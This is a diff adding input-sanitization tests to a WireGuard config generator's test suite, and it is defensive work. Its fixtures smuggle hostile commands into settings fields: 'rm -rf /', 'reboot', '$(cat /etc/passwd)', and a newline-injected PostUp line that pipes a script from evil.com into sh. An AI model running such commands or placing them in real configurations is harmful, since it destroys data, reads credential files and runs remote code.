@@ -52,4 +52,49 @@ describe('WireGuard Generator', () => {
     assert.ok(oneLiner.includes('rc-service'), 'should support OpenRC');
     assert.ok(oneLiner.includes('systemctl enable wg-quick@wg0'), 'should support systemd service');
   });
+
+  describe('Security & Input Sanitization', () => {
+    it('sanitizes interface names to prevent command injection and configuration directive injection', () => {
+      const maliciousSettings: WireGuardSettings = {
+        ...dummySettings,
+        serverInterface: "eth0; rm -rf / ' && echo hacked",
+        interfaceName: "wg0\nPostUp = curl http://evil.com/malware.sh | sh",
+      };
+
+      const serverConfig = generateWireGuardServerConfig(maliciousSettings);
+      assert.doesNotMatch(serverConfig, /rm -rf/);
+      assert.doesNotMatch(serverConfig, /echo hacked/);
+      assert.doesNotMatch(serverConfig, /\nPostUp = curl/);
+
+      const oneLiner = generateWireGuardServerOneLiner(maliciousSettings);
+      assert.doesNotMatch(oneLiner, /rm -rf/);
+      assert.doesNotMatch(oneLiner, /echo hacked/);
+      assert.doesNotMatch(oneLiner, /\| sh/);
+    });
+
+    it('sanitizes keys, endpoints, and IPs to prevent script breakout', () => {
+      const maliciousSettings: WireGuardSettings = {
+        ...dummySettings,
+        serverPrivateKey: "key' || rm -rf / ; #",
+        clientPublicKey: "pubKey' && reboot #",
+        serverEndpoint: "203.0.113.10' ; $(cat /etc/passwd) #",
+        serverIp: "10.8.0.1\nAddress = 0.0.0.0",
+        clientIp: "10.8.0.2' -- drop table users",
+        serverPort: 99999, // invalid port range
+      };
+
+      const serverConfig = generateWireGuardServerConfig(maliciousSettings);
+      assert.doesNotMatch(serverConfig, /\nAddress = 0\.0\.0\.0/);
+      assert.match(serverConfig, /ListenPort = 51820/); // falls back to default 51820
+
+      const clientConfig = generateWireGuardClientConfig(maliciousSettings);
+      assert.doesNotMatch(clientConfig, /\$\(cat/);
+      assert.doesNotMatch(clientConfig, /cat \/etc\/passwd/);
+
+      const oneLiner = generateWireGuardServerOneLiner(maliciousSettings);
+      assert.doesNotMatch(oneLiner, /' \|\|/);
+      assert.doesNotMatch(oneLiner, /' &&/);
+      assert.doesNotMatch(oneLiner, /'\s*;/);
+    });
+  });
 });
